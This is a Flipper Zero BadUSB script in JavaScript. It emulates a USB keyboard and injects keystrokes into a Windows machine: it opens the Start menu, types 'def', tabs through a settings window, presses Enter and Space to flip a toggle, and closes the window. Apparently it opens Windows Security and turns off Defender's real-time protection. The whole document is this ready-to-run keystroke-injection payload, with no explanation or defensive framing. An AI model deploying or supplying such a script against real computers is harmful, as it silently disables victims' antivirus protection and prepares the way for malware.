let badusb = require("badusb");

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}


badusb.press("GUI");
delay(300);
badusb.print("def");
delay(300);
badusb.press("ENTER");
delay(300);
badusb.press("ENTER");
delay(500);
badusb.press("TAB");
delay(800);
badusb.press("TAB");
delay(800);
badusb.press("TAB");
delay(800);
badusb.press("TAB");
delay(800);
badusb.press("ENTER");
delay(800);
badusb.press("SPACE");
delay(800);
badusb.press("TAB");
delay(800);
badusb.press("TAB");
delay(800);
badusb.press("TAB");
delay(800);
badusb.press("ENTER");
delay(800);
badusb.press("ALT" , "F4");

badusb.quit();

print("Done");